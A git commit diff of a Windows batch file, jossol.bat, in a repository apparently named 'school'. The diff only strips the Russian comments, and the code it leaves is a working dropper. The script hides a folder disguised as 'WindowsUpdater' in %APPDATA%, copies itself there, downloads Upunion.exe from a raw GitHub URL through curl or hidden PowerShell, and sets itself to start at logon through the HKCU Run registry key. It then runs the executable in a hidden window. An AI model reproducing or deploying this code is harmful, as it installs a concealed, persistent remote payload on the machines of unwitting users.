84e3d317f36ffa666a21152e877c74b35514f679
itment <100358823+poiko34@users.noreply.github.com>
2025-05-01 21:04:59 +0000

    Add files via upload

--- jossol.bat
+++ jossol.bat
@@ -3,31 +3,21 @@ set "URL=https://raw.githubusercontent.com/poiko34/school/refs/heads/main/Upunio
 set "TARGET_EXE=Upunion.exe"
 set "TARGET_BAT=jossol.bat"
 set "FOLDER=WindowsUpdater"
-
-:: Создаем скрытую папку
 if not exist "%APPDATA%\%FOLDER%" (
     mkdir "%APPDATA%\%FOLDER%" >nul 2>&1
     attrib +h "%APPDATA%\%FOLDER%" >nul 2>&1
 )
-
-:: Копируем скрипт
 if not exist "%APPDATA%\%FOLDER%\%TARGET_BAT%" (
     copy "%~f0" "%APPDATA%\%FOLDER%\%TARGET_BAT%" >nul 2>&1
     attrib +h "%APPDATA%\%FOLDER%\%TARGET_BAT%" >nul 2>&1
 )
-
-:: Скачиваем EXE
 if not exist "%APPDATA%\%FOLDER%\%TARGET_EXE%" (
     curl -L -o "%APPDATA%\%FOLDER%\%TARGET_EXE%" "%URL%" >nul 2>&1 || (
         powershell -window hidden -command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object Net.WebClient).DownloadFile('%URL%', '%APPDATA%\%FOLDER%\%TARGET_EXE%')" >nul 2>&1
     )
     attrib +h "%APPDATA%\%FOLDER%\%TARGET_EXE%" >nul 2>&1
 )
-
-:: Добавляем в автозагрузку через реестр
 reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "%FOLDER%" >nul 2>&1 || (
     reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "%FOLDER%" /t REG_SZ /d "cmd.exe /c start \"\" /B \"%APPDATA%\%FOLDER%\%TARGET_BAT%\"" /f >nul 2>&1
 )
-
-:: Запускаем EXE через скрытый PowerShell (без окон)
 powershell -WindowStyle Hidden -Command "Start-Process '%APPDATA%\%FOLDER%\%TARGET_EXE%' -WindowStyle Hidden" >nul 2>&1
